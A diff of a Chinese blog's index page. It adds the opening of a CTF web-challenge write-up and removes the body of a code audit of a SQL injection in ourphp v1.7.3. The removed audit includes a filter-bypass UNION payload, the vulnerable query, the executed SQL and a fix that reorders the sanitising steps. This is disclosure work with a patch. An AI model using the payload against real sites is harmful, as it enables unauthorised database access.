@@ -172,6 +172,7 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p>在全国大学生信息安全竞赛(线上赛)上划了波水，对我来说题目挺难的，好多姿势都没见过。</p>
+<h2 id="0x00-两个最简单的Web的题解"><a href="#0x00-两个最简单的Web的题解" class="headerlink" title="0x00 两个最简单的Web的题解"></a>0x00 两个最简单的Web的题解</h2><h3 id="Web-PHP-execise"><a href="#Web-PHP-execise" class="headerlink" title="Web-PHP execise"></a>Web-PHP execise</h3><p>这个题目考察了PHP的几个简单的语法<br>首先在题目中执行phpinfo()函数<br><img src="http://osn75zd5c.bkt.clouddn.com/Web-PHPexcise-1.png" alt="image"><br>在其中的找到被禁用的函数<br>
         
           <a class="article-more-a" href="/2017/09/10/国赛的两个Web题/#more">more >></a>
         
@@ -256,40 +257,10 @@
 <pre><code>)union selselectect 1,user(),3,4,5-- p0&apos;
 </code></pre><p>通过Payload往上找漏洞点</p>
 <pre><code>http://www.op.com/client/user/?cn-login.html
-</code></pre><p>首先根据登录页面的url，找到在templates/user目录下的cn_login.html,然后在会员登录表单中，找到调用的php文件的路径，在第31行</p>
-<pre><code>action=&quot;[.$webpath.]client/user/ourphp_play.class.php?ourphp_cms=login&quot;
-</code></pre><p>然后往上找到client/user目录中的ourphp_play.class.php，在第184行，将post传入的参数带入了数据库查询语句</p>
-<pre><code>$ourphp_rs = $db -&gt; select(&quot;`id`,`OP_Useremail`,`OP_Userpass`,`OP_Userstatus`,`OP_Username`&quot;,&quot;`ourphp_user`&quot;,&quot;WHERE (`OP_Useremail` = &apos;&quot;.dowith_sql($_POST[&quot;OP_Useremail&quot;]).&quot;&apos; || `OP_Usertel` = &apos;&quot;.dowith_sql($_POST[&quot;OP_Useremail&quot;]).&quot;&apos;) and `OP_Userpass` = &apos;&quot;.dowith_sql(substr(md5(md5($_REQUEST[&quot;OP_Userpass&quot;])),0,16)).&quot;&apos;&quot;);
-</code></pre><p>在其中使用了”dowith_sql()”函数将参数进行了过滤，很明显是自定义函数，定位一下，在function目录下的ourphp_function.php文件中的第10行.</p>
-<p>审计一下所谓的防注入函数，可以看到开发人员在此犯了一个严重的错误。首先使用addslashes()函数将一些敏感字符，比如单引号进行了转义，但是，在后续处理中又将单引号使用str_ireplace()函数替换掉了，这就相当于传入的单引号变成了反斜杠”\”。</p>
-<pre><code>第11行
-$ourphpstr = addslashes($ourphpstr);
-第35行
-$ourphpstr = str_ireplace(&quot;&apos;&quot;,&quot;&quot;,$ourphpstr);
-</code></pre><p>这个漏洞和前段时间的国赛中的一个Web题一样，题目是</p>
-<pre><code>wanna to see your hat?
-</code></pre><p>解题过程：</p>
-<pre><code>http://iwenhu.cn/2017/07/12/%E5%9B%BD%E8%B5%9B%E7%9A%84%E4%B8%A4%E4%B8%AAWeb%E9%A2%98.html
-</code></pre><p>而且在这个防注入函数中，开发者采用的一大串的str_ireplace函数来替换黑名单中的字符，有很大一部分是没有意义的，简单的双写一下就可以绕过.</p>
-<pre><code>比如 cocountunt,在里面一替换，就成了count
-</code></pre><p>在这时，payload经过函数处理，变成了</p>
-<pre><code>)union select 1,user(),3,4,5-- p0\
-</code></pre><p>这时带入了SQL查询语句中</p>
-<pre><code>select(&quot;`id`,`OP_Useremail`,`OP_Userpass`,`OP_Userstatus`,`OP_Username`&quot;,&quot;`ourphp_user`&quot;,&quot;WHERE (`OP_Useremail` = &apos;)union select 1,user(),3,4,5-- p0\&apos; || `OP_Usertel` = &apos;)union select 1,user(),3,4,5-- p0\&apos;) and `OP_Userpass` = &apos;&quot;.dowith_sql(substr(md5(md5($_REQUEST[&quot;OP_Userpass&quot;])),0,16)).&quot;&apos;&quot;);
-</code></pre><p>在这个语句中，因为最后面的那个单引号被处理成了反斜杠\,然后反斜杠将语句末尾的单引号转义，使得</p>
-<pre><code>(`OP_Useremail` = &apos;)union select 1,user(),3,4,5-- p0\&apos; || `OP_Usertel` = &apos;)
-</code></pre><p>通过Mysql监控工具可以找到执行的SQL语句</p>
-<pre><code>select `id`,`OP_Useremail`,`OP_Userpass`,`OP_Userstatus`,`OP_Username` from `ourphp_user` WHERE (`OP_Useremail` = &apos;)union select 1,user(),3,4,5-- p0\&apos; || `OP_Usertel` = &apos;)union select 1,user(),3,4,5-- p0\&apos;) and `OP_Userpass` = &apos;d9b1d7db4cd6e709&apos;
-</code></pre><p>在这里OP_Useremail为</p>
-<pre><code>)union select 1,user(),3,4,5-- p0\&apos; || `OP_Usertel` =
-</code></pre><p>语句中的union select执行了。后面的密码处理的语句都被注释符”– “注释掉了。这样就构成了一个SQL注入漏洞。</p>
-<h2 id="0x01-修补方案"><a href="#0x01-修补方案" class="headerlink" title="0x01 修补方案"></a>0x01 修补方案</h2><p>该漏洞最主要的原因是waf的处理逻辑有问题，可以把</p>
-<pre><code>$ourphpstr = str_ireplace(&quot;&apos;&quot;,&quot;&quot;,$ourphpstr);
-</code></pre><p>放到</p>
-<pre><code>$ourphpstr = addslashes($ourphpstr);
-</code></pre><p>的前面，先处理单引号，再转义敏感字符。这样的话漏洞就被处理掉了。</p>
-<p>对于双写绕过呢，可以用递归的方式检查参数，在牺牲小部分性能的情况下来获取服务器的安全，就是检查，过滤，检查，过滤，直到检查通过为止。</p>
-
+</code></pre><p>首先根据登录页面的url，找到在templates/user目录下的cn_login.html,然后在会员登录表单中，找到调用的php文件的路径，在第31行<br>
+        
+          <a class="article-more-a" href="/2017/09/10/ourphp-v1-7-3-SQL-Injection/#more">more >></a>
+        
       
 
       
